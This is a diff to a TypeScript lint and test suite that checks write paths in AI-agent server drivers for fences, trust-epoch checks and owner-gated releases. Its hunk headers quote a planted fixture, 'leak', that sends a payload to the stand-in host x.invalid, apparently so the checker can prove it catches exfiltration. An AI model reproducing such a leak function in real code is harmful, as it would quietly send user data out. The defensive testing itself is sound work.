@@ -246,7 +246,7 @@ function validatedFenceCall(call: ts.CallExpression, file: string, checker: ts.T
   const argument = call.arguments[3];
   if (!argument) return false;
   const expected: Record<string, string> = {
-    "server/drivers/acp/core.ts": '() => { if (turnHalted()) throw new Error("ACP_TURN_STOPPED"); fenceBeforeWrite(fence, state, obj, settleHalted); }',
+    "server/drivers/acp/core.ts": '() => { if (turnHalted()) throw new Error("ACP_TURN_STOPPED"); checkTrustEpoch(); fenceBeforeWrite(fence, state, obj, settleHalted); }',
     "server/drivers/codex.ts": '() => { const why = gate.why(entry); if (why || entry.done || stopRequested) throw new GateStopped(why); }',
     "server/drivers/pi.ts": '() => { if (stopGate.why(e) || e.done) throw new Error("PI_TURN_STOPPED"); }',
     "server/drivers/antigravity.ts": '() => { if (gate.why(entry) || entry.done || stopRequested) throw new GateStopped(gate.why(entry)); }',
@@ -1274,15 +1274,22 @@ function lintWriterContracts(prog: ts.Program): string[] {
     try {
       if (steerWrite) return emitEngineWire(beforeWrite, wire, write, () => {
         if (turnHalted()) throw new Error("ACP_TURN_STOPPED");
+        checkTrustEpoch();
         if (!beforeWrite) throw new Error("MEMORY_CONTEXT_REVOKED");
         beforeWrite();
       });
       return fencedSubmit(turn, write, wire, () => {
         if (turnHalted()) throw new Error("ACP_TURN_STOPPED");
+        checkTrustEpoch();
         fenceBeforeWrite(fence, state, obj, settleHalted);
       });
     } catch (error) { if (!steerWrite) submissionRefused = true; throw error; }
-  } : undefined`, "send");
+  } : beforeWrite && nativeAnswer ? <T>(wire: string, write: () => T): T =>
+    releaseNativeAnswer(turn.releaseBinding ?? null, "acp:approval", wire, () => {
+      beforeWrite();
+      return write();
+    }) : undefined`, "send");
+  requireNode("server/drivers/acp/core.ts", "ACP native response classification", `nativeAnswer = message.id !== undefined && (message.result !== undefined || message.error !== undefined)`, "send");
   // Both the pooled and unpooled transport must receive the same release.
   requireNode("server/drivers/acp/core.ts", "ACP pooled release forwarding", `writeTo(threadId, proc, obj, done, requestUrl, turn.releaseBinding, beforeWrite, release)`, "send");
   const requireTail = (file: string, fn: string, callee: string, tail: string) => {
@@ -1386,6 +1393,12 @@ function lintWriterContracts(prog: ts.Program): string[] {
     entered = true;
     return write();
   }`, "engineWriter");
+  // 1.0.21 cause4: emit's write() is this wrapper; the caller's write runs first and only an accepted release is counted after it.
+  requireNode("server/drivers/engine-input.ts", "final write runs the caller's write first", `write = (): R => {
+      const taken = release();
+      for (const budget of budgets) budget.accepted();
+      return taken;
+    }`, "engineWriter");
   if (cacheKey) writerContractObservations.set(cacheKey, out);
   return out;
 }
@@ -1467,6 +1480,7 @@ describe("the learning send boundary (section 4)", () => {
     // Callback metadata on an ordinary call still cannot bypass owner checks.
     const release = hops.find(hop => hop.file === "server/drivers/acp/approval-delivery.ts" && hop.callback === 1)!;
     expect(release).toBeTruthy();
+    expect(lintHop(base, release, pins.timers ?? [])).toEqual([]);
     expect(lintHop(base, { ...release, callback: 0 }, pins.timers ?? []).join("\n")).toMatch(/unreviewed writer callback hop/);
   });
   it("checks every explicitly indexed repeated submission hook and rejects incomplete coverage", () => {
@@ -2018,6 +2032,7 @@ export const leak = (payload: string) => client.fetch("https://x.invalid", { met
       }, 600_000);
       it("rejects a chain whose helper has no pin of its own", () => {
         const unpinned = { ...pins, sinks: pins.sinks.map(e => e.file === MUSE && e.fn === "writeControl" ? { ...e, reason: "not-learning" as const, admittedBy: "" } : e) };
+        expect(diff(found, pins)).toEqual([]);
         expect(diff(found, unpinned).join("\n")).toMatch(/chain muse: no adapter-write pin for its helper writeControl/);
       });
     });
@@ -2093,6 +2108,7 @@ export const leak = (payload: string) => client.fetch("https://x.invalid", { met
       expect(planted({ [file]: bad }).join("\n")).toMatch(/a learning sendTurn without the fencedWrite fence: server\/drivers\/cli-memory-learning\.ts\|hiddenTurnRunner\|sendTurn/);
       // re-pinning it under any other reason fails too
       const repinned = { ...pins, sinks: pins.sinks.map(e => e.kind === "sendTurn" && e.file === file ? { ...e, reason: "not-learning" as const, admittedBy: "" } : e) };
+      expect(diff(found, pins)).toEqual([]);
       expect(diff(found, repinned).join("\n")).toMatch(/a learning sendTurn without the fencedWrite fence/);
     }, 600_000);
     it("the learning pins name their admission (H4)", () => {
@@ -2101,8 +2117,9 @@ export const leak = (payload: string) => client.fetch("https://x.invalid", { met
       // MAIN RULING (§3): "owner No limits authority comes ONLY from an authenticated owner turn (the turn's own verified origin), never from thread ownership"
       // These admissions name the captured writer; they confer no owner permission.
       // MAIN RULING INT-CONFLICT-DEFAULT 434e85e2b0 / 90b159a048: keep exact direct and posture release-owner rows.
+      // dev/1022 moved the ACP session/prompt setup out of launch into acpSetupBoundary/afterSetup; the pin is now afterSetup (same learning-path, chain:acp admission).
       expect(learning.map(e => `${e.file}|${e.fn}|${e.reason}|${e.admittedBy}`).sort()).toEqual([
-        "server/drivers/acp/core.ts|launch|learning-path|chain:acp",
+        "server/drivers/acp/core.ts|afterSetup|learning-path|chain:acp",
         "server/drivers/acp/core.ts|request|learning-path|chain:acp",
         "server/drivers/acp/core.ts|send|learning-path|chain:acp",
         "server/drivers/acp/core.ts|send|learning-path|chain:acp",
@@ -2133,8 +2150,9 @@ export const leak = (payload: string) => client.fetch("https://x.invalid", { met
       const learning = [...pins.sinks, ...pins.callers].filter(pin => pin.reason === "learning-path" || pin.reason === "learning-local").map(pin => pin.file === "server/drivers/codex.ts" && pin.fn === "launchAttempt" ? { ...pin, fn: "launchBody" } : pin);
       learning.push({ ...direct!, reason: "learning-path", admittedBy: "chain:acp" }, { ...posture!, reason: "learning-path", admittedBy: "chain:codex" });
       // MAIN RULING INT-CONFLICT-DEFAULT 434e85e2b0 / 90b159a048: retain both actual inventory rows and these additional physical-path witnesses.
+      // dev/1022 moved the ACP session/prompt setup out of launch into acpSetupBoundary/afterSetup; the pin is now afterSetup (same learning-path, chain:acp admission).
       expect(learning.map(e => `${e.file}|${e.fn}|${e.reason}|${e.admittedBy}`).sort()).toEqual([
-        "server/drivers/acp/core.ts|launch|learning-path|chain:acp",
+        "server/drivers/acp/core.ts|afterSetup|learning-path|chain:acp",
         "server/drivers/acp/core.ts|request|learning-path|chain:acp",
         "server/drivers/acp/core.ts|send|learning-path|chain:acp",
         "server/drivers/acp/core.ts|send|learning-path|chain:acp",
@@ -2155,6 +2173,7 @@ export const leak = (payload: string) => client.fetch("https://x.invalid", { met
       expect(planted({ [file]: bad }).join("\n")).toMatch(/send inside pinnedCall/);
     }, 600_000);
     it("an exemption whose line moved", () => {
+      expect(diff(found, pins)).toEqual([]);
       const moved = { ...pins, sinks: pins.sinks.map((e, i) => i === 0 ? { ...e, anchor: e.anchor + "x" } : e) };
       expect(diff(found, moved).join("\n")).toMatch(/vanished or moved sink pin/);
     });
